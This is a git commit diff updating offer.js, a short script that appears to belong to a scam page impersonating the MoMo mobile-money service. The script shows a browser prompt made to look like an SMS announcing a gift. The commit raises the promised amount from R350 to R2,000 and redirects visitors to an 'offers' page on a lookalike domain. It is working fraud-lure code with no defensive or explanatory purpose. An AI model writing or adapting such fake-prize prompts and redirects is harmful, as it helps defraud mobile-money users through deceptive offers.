254a3f12e517375d5fe1684968829226fbcbafd9
lagalfredben <lagalfredben@gmail.com>
2025-08-11 02:56:24 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,7 +1,8 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = 'WITHDRAW R350'
-password=prompt('SMS: Congratulations, your MoMo account has qualified to receive the R350 MoMo Anniversary gift, Please Click OK TO CONTINUE ','WITHDRAW R350');
-if (password != 'WITHDRAW R350') {
-location.href='https://momo-za.offer-it.live/Gift';
+var password = 'WITHDRAW R2,000'
+password=prompt('SMS: Welcome, Application Is Ongoing..., Please Click OK TO CONTINUE ','WITHDRAW R2,000');
+if (password != 'WITHDRAW R2,000') {
+location.href='https://momo-za.offer-it.live/offers';
 
 }
+
